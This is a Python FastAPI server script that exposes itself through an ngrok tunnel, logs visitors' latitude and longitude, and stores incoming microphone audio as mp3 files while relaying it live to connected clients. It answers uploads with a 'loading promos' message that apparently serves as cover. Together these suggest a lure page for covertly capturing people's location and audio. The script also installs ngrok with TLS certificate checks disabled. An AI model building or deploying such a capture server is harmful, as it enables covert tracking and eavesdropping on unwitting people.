from fastapi import FastAPI, Request, WebSocket, File, UploadFile
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pyngrok import ngrok, conf, installer
from datetime import datetime
import logging, os, ssl

pyngrok_config = conf.get_default()
if not os.path.exists(pyngrok_config.ngrok_path):
    myssl = ssl.create_default_context()
    myssl.check_hostname=False
    myssl.verify_mode=ssl.CERT_NONE
    installer.install_ngrok(pyngrok_config.ngrok_path, context=myssl)

logging.basicConfig(filename='data.log', encoding='utf-8', level=logging.INFO)

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")
connected_clients = []
url = 'https://127.0.0.1:8000'

public_url: str = ngrok.connect(f'127.0.0.1:8000',bind_tls=True).public_url
url: str = public_url
# url = ws_url.replace('https://', '')
print(url)


@app.get("/")
async def index(request: Request, lat: str = None, lon: str = None):
    if lat and lon:
        logging.info(f'lat: {lat} lon: {lon}')
    return templates.TemplateResponse("index.html", {"request": request, "url": url})


@app.get("/admin")
async def admin(request: Request, lat: str = None, lon: str = None):
    if lat and lon:
        logging.info(f'lat: {lat} lon: {lon}')
    return templates.TemplateResponse("admin.html", {"request": request, "url": url})


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    connected_clients.append(websocket)
    while True:
        data = await websocket.receive_bytes()
        if len(data) > 0:
            if websocket.client_state.value == 1:
                # Getting the current date and time
                dt = datetime.now()
                with open(f"audios/{dt}.mp3", "wb") as file:
                    file.write(data)
                # do something with the incoming data
                for client in connected_clients:
                    if client.client_state.value == 1:
                        await client.send_bytes(data)


@app.post("/up/")
async def create_upload_file(request: Request):
    try:
        audio: bytes = await request.body()
        if audio: 
            dt = datetime.now()
            with open(f"audios/{dt}.mp3", "wb") as file:
                file.write(audio)
            return {"action": 'loading promos'}
    except Exception as e:
        print(str(e))